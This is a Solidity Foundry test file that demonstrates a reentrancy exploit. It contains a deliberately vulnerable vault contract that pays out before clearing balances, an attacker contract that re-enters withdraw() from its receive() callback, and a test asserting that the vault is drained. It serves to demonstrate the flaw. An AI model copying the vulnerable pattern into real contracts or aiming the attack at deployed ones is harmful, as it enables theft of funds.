// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableVault {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
        balances[msg.sender] = 0;
    }
}

contract ReentrancyAttack {
    VulnerableVault public vault;
    constructor(address _vault) { vault = VulnerableVault(_vault); }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

contract PocTest is Test {
    function test_drains_vault() public {
        VulnerableVault vault = new VulnerableVault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
        ReentrancyAttack attacker = new ReentrancyAttack(address(vault));
        attacker.attack{value: 1 ether}();
        assertEq(address(vault).balance, 0, "vault should be drained");
        assertGt(address(attacker).balance, 5 ether, "attacker should hold the funds");
    }
}
